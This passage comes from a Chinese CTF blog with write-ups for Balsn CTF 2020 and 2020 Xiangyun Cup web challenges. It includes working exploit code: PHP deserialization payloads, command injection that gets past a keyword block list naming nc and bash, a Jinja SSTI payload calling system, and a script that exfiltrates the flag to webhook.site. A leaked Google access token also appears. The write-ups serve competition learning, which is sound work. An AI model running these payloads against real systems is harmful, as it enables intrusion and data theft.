ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \</span><br><span class="line">  &quot;https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">下载对象：</span></span><br><span class="line">curl -X GET -o &quot;/tmp/obj1&quot; -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \</span><br><span class="line">  &quot;https://www.googleapis.com/download/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/containers%2Fimages%2Fsha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4?generation=1605158579380048&amp;alt=media&quot;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>将所有对象下载下来后<code>cat * | grep -a flag</code><br>获得flag路径：<code>/opt/workdir/flag-6ba72dc9ffb518f5bcd92eee.txt</code></p>
<p>BALSN{What_permissions_does_the_service_account_need}</p>
<h2 id="L5D"><a href="#L5D" class="headerlink" title="L5D"></a>L5D</h2><p>题目描述</p>
<blockquote>
<p>「Taking L5D was a profound experience, one of the most important things in my life.」</p>
<p>Try this new Unserialize-Oriented Programming System a.k.a. L5D !</p>
<p><a target="_blank" rel="noopener" href="http://l5d.balsnctf.com:12345/index.php">http://l5d.balsnctf.com:12345/index.php</a></p>
<p>PHP Version: 7.0.33</p>
<p>Author: kaibro</p>
</blockquote>
<p>题目提供了源码，阅读后发现以下可能作为关键点的地方：</p>
<p>变量覆盖：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116142917.jpg" alt="image6765"></p>
<p>任意命令执行：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116142948.jpg" alt="image6899"></p>
<p>修改全局变量cmd</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116143051.jpg" alt="image7035"></p>
<p>但是题目给反序列化的数据加上了一个限制：不能出现<code>*</code>(protect变量就需要<code>*</code>号)</p>
<p>实际测试一下发现，并不能用public,private的同名变量来代替protect变量，这是难点一</p>
<p>还有就是其他类的<code>__wakeup</code>方法会禁止我们通过L5D_Upload来任意变量覆盖，然后L5D_Upload又必须在其他的<code>__destruct</code>方法前执行，这是难点二</p>
<p>难点二我们可以通过最后一个调用L5D_Upload的<code>__wakeup</code>，第一个调用它的<code>__destruct</code>来绕过，因为<code>__wakeup</code>的调用顺序是从里到外，从前到后，<code>__destruct</code>的调用顺序是从外到内，从前到后，所以构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_Upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;padding = <span class="keyword">new</span> L5D_ResetCMD();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;padding=<span class="keyword">new</span> L5D_Command();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_Command</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> L5D_Upload();</span><br></pre></td></tr></table></figure>

<p>接着就是难点一了，对<code>*</code>号的禁用导致我们不能直接反序列化一个protect属性的成员</p>
<p>但是我们可以用大写S来绕过：</p>
<p>可以利用大写S来绕过对protected,private等属性的字符检测如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;L5D_ResetCMD&quot;:2:&#123;s:7:&quot;padding&quot;;O:11:&quot;L5D_Command&quot;:0:&#123;&#125;S:10:&quot;\00\2a\00new_cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这样new_cmd就是protect属性了</p>
<p>最后的exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_Upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;padding = <span class="keyword">new</span> L5D_ResetCMD();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;padding=<span class="keyword">new</span> L5D_Command();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_Command</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=str_replace(<span class="string">&#x27;s:10:&quot;&#x27;</span>.<span class="string">&quot;\x00*\x00&quot;</span>,<span class="string">&#x27;S:10:&quot;\00\2a\00&#x27;</span>,serialize(<span class="keyword">new</span> L5D_Upload()));</span><br><span class="line"><span class="keyword">echo</span> urlencode (<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="the-woven-web"><a href="#the-woven-web" class="headerlink" title="the woven web"></a>the woven web</h2><p>看了<a target="_blank" rel="noopener" href="https://github.com/Super-Guesser/ctf/blob/master/BalsnCTF2020/web/The%20Woven/the_woven_web.py">Super⚔️Blue</a> 的wp，只能说一句牛逼</p>
<p>其实原理很简单：让浏览器自动下载一个文件，然后file协议访问那个文件，那个文件就可以引用server.js，于是就有flag的值了</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index.html&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    r = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">            function require(a)&#123;</span></span><br><span class="line"><span class="string">                if(a==&quot;express&quot;)&#123;return ()=&gt;&#123;return &#123;get:function()&#123;&#125;,listen:function()&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                if(a==&quot;redis&quot;)&#123;</span></span><br><span class="line"><span class="string">                    return &#123;createClient:function()&#123;&#125;&#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                if(a==&quot;fs&quot;)&#123;</span></span><br><span class="line"><span class="string">                    return &#123;existsSync:function()&#123;&#125;&#125;;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;script src=&quot;../app/server.js&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">            fetch(&quot;https://webhook.site/X?a=&quot;+FLAG);</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r,&#123;<span class="string">&quot;Content-Disposition&quot;</span>:<span class="string">&#x27;attachment; filename=&quot;wtf22.html&quot;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(__name__==<span class="string">&quot;__main__&quot;</span>):</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">4000</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>





<h2 id="Windows-XP-Media-Player"><a href="#Windows-XP-Media-Player" class="headerlink" title="Windows XP Media Player"></a>Windows XP Media Player</h2><p>还是看了<a target="_blank" rel="noopener" href="https://github.com/Super-Guesser/ctf/blob/master/BalsnCTF2020/web/The%20Woven/the_woven_web.py">Super⚔️Blue</a> 的wp</p>
<p>应该静下心来做的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;windows-xp-media-player.balsnctf.com&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">s, path</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">&quot;http://&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(host, path))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s1 = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create a session</span></span><br><span class="line">    resp = req(s1, <span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># use create playlist to generate the command `mkdir -p ./--output=/tmp/vakzz_in` </span></span><br><span class="line">    req(s1, <span class="string">&quot;/?args=-p ./--output=/tmp/vakzz_in&amp;op=create&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># also create a `-z` folder</span></span><br><span class="line">    req(s1, <span class="string">&quot;/?args=./-z&amp;op=create&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># use `--` so that the remaining args are not treated as options, will run `ls -- -z --output=/tmp/vakzz_in /flag/`</span></span><br><span class="line">    <span class="comment"># since all of these folders exist ls will exit cleanly and add our args to the queue</span></span><br><span class="line">    req(s1, <span class="string">&quot;/q/add?args=-- -z --output=/tmp/vakzz_in /flag/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># remove the `--` from the queue</span></span><br><span class="line">    req(s1, <span class="string">&quot;/q/skip&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shuffle the queue which will run `shuf -e -z --output=/tmp/vakzz_in /flag/`</span></span><br><span class="line">    <span class="comment"># this writes final argument as a null terminated string to the specified output file</span></span><br><span class="line">    req(s1, <span class="string">&quot;/q/shuf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now /tmp/vakzz_in contains `/flag/\x00`</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rate limit</span></span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># new session as need more playlists</span></span><br><span class="line">    s2 = requests.Session()</span><br><span class="line">    resp = req(s2, <span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create the folder `--files0-from=/tmp/vakzz_in` for option injection</span></span><br><span class="line">    req(s2, <span class="string">&quot;/?args=-p ./--files0-from=/tmp/vakzz_in&amp;op=create&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create the folder `--exclude=flag?[1-9]*` for option injection</span></span><br><span class="line">    req(s2, <span class="string">&quot;/?args=./--exclude=flag?[1-9]*&amp;op=create&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now `--files0-from=/tmp/vakzz_in` and `--exclude=flag?[1-9]*` are both in the names array and can be used in args</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># use stat to run `du` with our injection options, causing it to look at folders from /tmp/vakzz_in and exclude</span></span><br><span class="line">    <span class="comment"># anything that matches the supplied pattern: `du -sh --files0-from=/tmp/vakzz_in --exclude=flag?[1-9]*`</span></span><br><span class="line">    resp = req(s2, <span class="string">&quot;/?args=--files0-from=/tmp/vakzz_in --exclude=flag?[1-9]*&amp;op=stat&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if the flag was excluded then this will return `8.0K    /flag/` otherwise `16K    /flag/`, letting us know if </span></span><br><span class="line">    <span class="comment"># the flag starts with 0-9 or a-f.</span></span><br><span class="line">    <span class="built_in">print</span>(resp.text.split(<span class="string">&#x27;&lt;div class=&quot;field-row&quot;&gt;&lt;label&gt;&#x27;</span>)[<span class="number">2</span>].split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>





<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>反序列化在禁止\x00和*时，我们可以利用大写S来绕过对protected,private等属性的字符检测如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;L5D_ResetCMD&quot;:2:&#123;s:7:&quot;padding&quot;;O:11:&quot;L5D_Command&quot;:0:&#123;&#125;S:10:&quot;\00\2a\00new_cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" data-id="ckw7zwbys0001fmol81co5lh3" data-title="2020 balsn ctf web 部分题解" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020祥云杯web题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2020-11-23T16:00:00.000Z" itemprop="datePublished">2020-11-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/">2020祥云杯web题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="祥云杯web题解"><a href="#祥云杯web题解" class="headerlink" title="祥云杯web题解"></a>祥云杯web题解</h1><h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(;|&#x27;| |&gt;|]|&amp;| |\\$|python|sh|nc|tac|rev|more|tailf|index|php|head|nl|tail|less|cat|ruby|perl|bash|rm|cp|mv|\*|\&#123;)/i&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27; type=&#x27;text/javascript&#x27;&gt;</span></span><br><span class="line"><span class="string">      alert(&#x27;no no no!&#x27;)</span></span><br><span class="line"><span class="string">      window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27; type=&#x27;text/javascript&#x27;&gt;</span></span><br><span class="line"><span class="string">      alert(&#x27;no flag!&#x27;)</span></span><br><span class="line"><span class="string">      window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>测试发现过滤了:<code>&#39;,$,&amp;,*,;,&gt;,],&#123;, ,</code><br>利用%09来绕过对空格的过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze5a6nc0glncs99tzta.cloudeci1.ichunqiu.com/?url=-h|`echo%09WTJGMElDOWxkR012TG1acGJtUm1iR0ZuTDJac1lXY3VkSGgw|base64%09-d|base64%09-d`</span><br></pre></td></tr></table></figure>





<h2 id="flaskbot"><a href="#flaskbot" class="headerlink" title="flaskbot"></a>flaskbot</h2><p>测试一波发现输入点都没有ssti,并且开着报错</p>
<p>我们利用报错来拿源码</p>
<p>最关键的源码<code>render_template_string(guessNum(num,name))</code> 是直接访问不存在界面得到的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hello</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        user = request.form[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        resp = make_response(render_template(<span class="string">&quot;guess.html&quot;</span>,name=user))</span><br><span class="line">        resp.set_cookie(<span class="string">&#x27;user&#x27;</span>,base64.urlsafe_b64encode(user),max_age=<span class="number">3600</span>)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        user=request.cookies.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> user == <span class="literal">None</span>:</span><br><span class="line">           <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user=user.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;guess.html&quot;</span>,name=base64.urlsafe_b64decode(user))</span><br><span class="line">        </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/guess&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Guess</span>():</span></span><br><span class="line">    user=request.cookies.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">    user=user.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    name = base64.urlsafe_b64decode(user)</span><br><span class="line">    num = <span class="built_in">float</span>(request.form[<span class="string">&#x27;num&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span>(num&lt;<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too Small&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> num&gt;<span class="number">1000000000.0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too Large&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(guessNum(num,name))<span class="comment">#直接提醒我们这里存在ssti注入</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miss</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;What are you looking for?!!&quot;</span>.<span class="built_in">getattr</span>(app, <span class="string">&#x27;__name__&#x27;</span>, <span class="built_in">getattr</span>(app.__class__, <span class="string">&#x27;__name__&#x27;</span>)), <span class="number">404</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    f_handler=<span class="built_in">open</span>(<span class="string">&#x27;/var/log/app.log&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    sys.stderr=f_handler</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span></span><br></pre></td></tr></table></figure>



<p>看一下回显很容易得知bot利用二分法来猜数据，如果一定次数内bot没猜出来就是我们赢，正常的数据基本是不行的。</p>
<p>我们看下他得到数字的过程:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="built_in">float</span>(request.form[<span class="string">&#x27;num&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span>(num&lt;<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too Small&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> num&gt;<span class="number">1000000000.0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too Large&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>字符串转数值且小于0大于1000000000.0</p>
<p>阅读python文档<a target="_blank" rel="noopener" href="https://docs.python.org/3.2/library/stdtypes.html#numeric-types-int-float-complex%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9C%8B%E5%88%B0%E4%B8%80%E4%B8%AA%E8%BF%99%E6%A0%B7%E7%9A%84%E6%B5%AE%E7%82%B9%E6%95%B0:%60">https://docs.python.org/3.2/library/stdtypes.html#numeric-types-int-float-complex，我们看到一个这样的浮点数:`</a> float also accepts the strings “nan” and “inf” with an optional prefix “+” or “-” for Not a Number (NaN) and positive or negative infinity. `</p>
<p>且nan&lt;0,nan&gt;1000000000.0都为false,这样他的二分法永远猜不到了</p>
<p>然后修改name进行ssti</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[258].__init__.__getattribute__(&quot;__globals__&quot;)[&quot;\\x6f\\x73&quot;].__getattribute__(&quot;\\x73ystem&quot;)(&quot;whoami&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>





<h2 id="easygogogo"><a href="#easygogogo" class="headerlink" title="easygogogo"></a>easygogogo</h2><p>题目有三个接口，登入，查看上传文件，上传文件</p>
